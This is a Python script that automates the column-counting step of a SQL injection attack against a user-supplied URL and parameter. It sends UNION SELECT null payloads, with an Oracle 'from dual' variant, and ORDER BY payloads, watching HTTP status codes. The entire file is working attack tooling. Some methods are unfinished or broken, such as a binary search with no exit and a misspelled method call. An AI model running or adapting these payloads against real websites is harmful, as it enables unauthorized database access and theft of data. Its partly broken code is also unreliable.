import requests
import urllib
import argparse
from colorama import Fore, Back, Style


class AmountOfColumns():
    __amount_of_columns = 0
    __url = ''
    __db_exploit = ''
    __dboracle_exploit = ''
    __param_name = ''
    __order_by_int = 0

    def __init__(self, url, param_name, amount_of_columns, method=1):
        self.vars_validation(url, amount_of_columns, method)
        self.__method = method
        self.__amount_of_columns = amount_of_columns
        self.__url = url
        self.__param_name = param_name
        self.configure_exploit()

    def vars_validation(self, url, amount_of_columns, method):
        if 'http' not in url:
            self.print_red('[-] Wrong url format!')
            exit()

        if method != 1 and method != 2:
            self.print_red("[-] Wrong method!")
            exit()

        try: 
            if amount_of_columns <= 0:
                self.print_red("[-] Amount of columns has to be greater then 0.\n[*] Exiting...")
                exit()
        except Exception as e:
            self.print_red("[-] Amount of columns has to be greater then 0.\n[*] Exiting...")
            exit()


    ''' Run '''
    def queue_method(self):
        for i in range(self.__amount_of_columns):
            if '200' in self.make_request():
                self.print_green(f'[+] Amount of columns: {i+1}')
                exit()
            self.add_nulls()
            
        self.print_red('[-] Amount of columns not found.')
        exit()

    def binary_search_method(self) -> int:
        # still under contruction. I have no time because of exams at uni lmfao
        tmp_counter = self.__amount_of_columns/2
        tmp_found = False
        while True:
            if self.is_greater(tmp_counter):
                # Check if found
                if tmp_counter > 1:
                    if not self.is_greater(tmp_counter - 1):
                        return tmp_counter - 1
                


    def is_greater(self, response) -> bool:
        if '500' in response:
            return True
        return False

    def order_by_paylaod(self) -> str:
        tmp_request = '\' order by '
        comment = '-- -'
        return tmp_request + str(self.__order_by_int) + comment

    def increase_order_by_request_int(self) -> None:
        self.__order_by_int += 1

    def order_by_request(self, final_url) -> str:
        response = requests.get(final_url)
        self.print_green(response)

    def test_order_by_run(self) -> None:
        self.print_green(self.order_by_paylaod())
        self.increase_order_by_request_int()
        self.print_green(self.encode_url(self.order_by_paylaod()))
        tmp_url = self.encode_url(self.order_by_paylaod())
        self.order_by_request(tmp_url)

    def run(self):
        if self.__method == 1:
            self.queue_method()
        else:
            self.binary_serach_method()

    def test_run(self):
        self.show_data()
        self.make_request()
        self.add_nulls()
        self.make_request()
        self.add_nulls()
        self.make_request()

    def test_data_run(self):
        self.show_data()
        self.configure_exploit()
        self.add_nulls()
        self.show_data() 

    ''' Data '''
    def configure_params(self, param_name, params_values):
        if len(param_name) != len(params_values):
            self.print_red('[-] Error occurred!. Amount of parameters names is different from amount of values!')
            self.print_red( '[*] Exiting... ')
            exit()
        for i in range(0, len(param_name)):
            self.__params_dict[param_name[i]] = params_values[i]

    def show_data(self):
        self.print_green(f'Url: {self.__url}')
        self.print_green(f'Amount of columns: {self.__amount_of_columns}')
        self.print_red(f'DB exploit: {self.__db_exploit}')
        self.print_red(f'DB oracle exploit: {self.__dboracle_exploit}')

    ''' Actual script '''
    def make_request(self)->str:
        response_db = requests.get(self.encode_db_url())        
        response_dboracle = requests.get(self.encode_dboracle_url())

        return str(response_dboracle)+str(response_db)

    def encode_url(self, url_to_encode) -> str():
        url_to_encode = self.__url + self.__param_name + '=' + urllib.parse.quote(url_to_encode)
        if '%27' in url_to_encode:
            url_to_encode = url_to_encode.replace('%27', '\'')
        return url_to_encode

    def encode_db_url(self) -> str:
        ''' Url encoding for a non oracle db'''
        complete_db_url = self.__url
        complete_dboracle_url = self.__url
        complete_db_url += self.__param_name + '=' + urllib.parse.quote(self.__db_exploit)
        complete_dboracle_url += self.__param_name + '=' + urllib.parse.quote(self.__dboracle_exploit)
        
        if '%27' in complete_db_url:
            complete_db_url = complete_db_url.replace('%27', '\'')
        return complete_db_url
        

    def encode_dboracle_url(self):
        ''' Url encoding for an oracle db '''
        complete_dboracle_url = self.__url
        complete_dboracle_url += self.__param_name + '=' + urllib.parse.quote(self.__dboracle_exploit)

        if '%27' in complete_dboracle_url:
            complete_dboracle_url = complete_dboracle_url.replace('%27', '\'')
        return complete_dboracle_url


    def configure_exploit(self):
        dbnull = 'null'
        dboracle_null = 'null from dual'
        comment = '-- -'
        exploit_db = f'\' and 1=0 union select -- -'
        exploit_oracle_db = f'\' and 1=0 union select -- -'

        self.__dboracle_exploit = exploit_db[:-4]  + dboracle_null + comment
        self.__db_exploit = exploit_oracle_db[:-4]  + dbnull + comment

    def add_nulls(self):
        dbnull = ',null'
        dboracle_null = ',null from dual' # 10
        comment = '-- -'

        self.__db_exploit = self.__db_exploit[:-4] + dbnull  + comment
        self.__dboracle_exploit = self.__dboracle_exploit[:-14] + dboracle_null + comment


    def print_red(self, message):
        print(Fore.RED, message, Style.RESET_ALL)

    def print_green(self, message):
        print(Fore.GREEN, message, Style.RESET_ALL)


    


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Finding amount of columns.')
    parser.add_argument('--url', '-u', type=str, nargs=1, help='Provide a clean url without any parameters.')
    parser.add_argument('--param_name', '-pn', nargs=1, type=str, help='Provide names of parameters and then remeber to add values For parameters. For more help type python3 <filename> --help.\n')
    parser.add_argument('--amount_of_columns', '-ac', nargs=1, type=int, help='Please provide a number of columns.')
    parser.add_argument('--method', '-m', type=int, nargs=1, help='Please provide the methos: binary search (1) or brute search (2)')
    args = parser.parse_args()


    # bs = AmountOfColumns(args.url[0], args.param_name[0], args.amount_of_columns[0], args.method[0])
    bs = AmountOfColumns(args.url[0], args.param_name[0], args.amount_of_columns[0])
    bs.test_order_by_run()
